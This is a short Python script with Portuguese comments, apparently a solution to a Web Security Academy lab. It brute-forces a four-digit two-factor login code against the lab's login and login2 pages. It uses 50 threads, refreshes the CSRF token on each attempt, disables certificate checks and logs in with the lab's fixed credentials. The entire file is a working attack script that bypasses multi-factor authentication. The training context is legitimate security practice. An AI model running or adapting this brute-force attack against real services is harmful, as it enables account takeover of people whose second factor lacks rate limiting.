# Esse código NÃO é de autoria minha, apenas uma adaptação mais simplista

import requests
from bs4 import BeautifulSoup
import threading
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_csrf_token(html):
    soup = BeautifulSoup(html, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    if csrf_input:
        return csrf_input['value']
    return None

# Coloque a url do lab aqui
base_url = 'https://0a8900dd04f605f480e6954e00e4009d.web-security-academy.net/'

tested_mfa_codes = set()

max_threads = 50
semaphore = threading.Semaphore(max_threads)

def process_mfa_code(mfa_code):
    if mfa_code in tested_mfa_codes:
        return
    
    tested_mfa_codes.add(mfa_code)

    semaphore.acquire()

    try:
        session = requests.Session()
        
        response = session.get(base_url + 'login', verify=False)
        csrf_token = extract_csrf_token(response.text)

        payload = {
            'username': 'carlos',
            'password': 'montoya',
            'csrf': csrf_token
        }
        response = session.post(base_url + 'login', data=payload, verify=False)

        response = session.get(base_url + 'login2', verify=False)
        csrf_token_login2 = extract_csrf_token(response.text)

        payload_login2 = {
            'csrf': csrf_token_login2,
            'mfa-code': mfa_code
        }

        response = session.post(base_url + 'login2', data=payload_login2, verify=False)

        if 'Incorrect security code' not in response.text:
            print(f'\033[92mMFA code {mfa_code} valido.\033[0m')
        else:
            print(f'Mfa code {mfa_code} invalido code: {response.status_code}')
    finally:
        semaphore.release()

threads = []

mfa_codes = ['{:04d}'.format(i) for i in range(10000)]

for mfa_code in mfa_codes:
    thread = threading.Thread(target=process_mfa_code, args=(mfa_code,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()